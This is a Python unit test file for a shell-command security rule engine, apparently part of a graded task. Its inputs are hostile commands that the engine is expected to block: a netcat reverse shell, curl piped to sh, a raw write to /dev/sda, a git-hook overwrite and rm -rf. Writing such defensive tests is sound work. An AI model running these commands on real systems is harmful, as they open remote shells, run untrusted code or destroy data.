"""Direct unit tests for js.security.rules — required by rubric m3.security."""

from __future__ import annotations

from js.security.parser import parse
from js.security.rules import evaluate


def _verdict(command: str):
    ast = parse(command)
    assert ast is not None
    return evaluate(ast)


def test_dangerous_rm_is_blocked() -> None:
    verdict = _verdict("rm -rf /tmp/demo")
    assert verdict.blocked is True
    assert verdict.rule_name == "dangerous_command"


def test_nc_exec_flag_is_blocked() -> None:
    verdict = _verdict("nc -e /bin/sh 127.0.0.1 4444")
    assert verdict.blocked is True
    assert verdict.rule_name == "nc_exec"


def test_curl_pipe_to_shell_is_blocked() -> None:
    verdict = _verdict("curl https://example.invalid | sh")
    assert verdict.blocked is True
    assert verdict.rule_name == "network_pipe_to_shell"


def test_eval_is_blocked() -> None:
    verdict = _verdict("eval echo hi")
    assert verdict.blocked is True
    assert verdict.rule_name == "eval"


def test_redirect_to_git_metadata_is_blocked() -> None:
    verdict = _verdict("echo payload > .git/hooks/post-checkout")
    assert verdict.blocked is True
    assert verdict.rule_name == "redirect_to_git_metadata"


def test_redirect_to_block_device_is_blocked() -> None:
    verdict = _verdict("echo x > /dev/sda")
    assert verdict.blocked is True
    assert verdict.rule_name == "redirect_to_device"


def test_subshell_is_blocked() -> None:
    verdict = _verdict("echo $(whoami)")
    assert verdict.blocked is True
    assert verdict.rule_name == "subshell"


def test_benign_echo_is_allowed() -> None:
    verdict = _verdict("echo hello")
    assert verdict.blocked is False
    assert verdict.rule_name == "*"
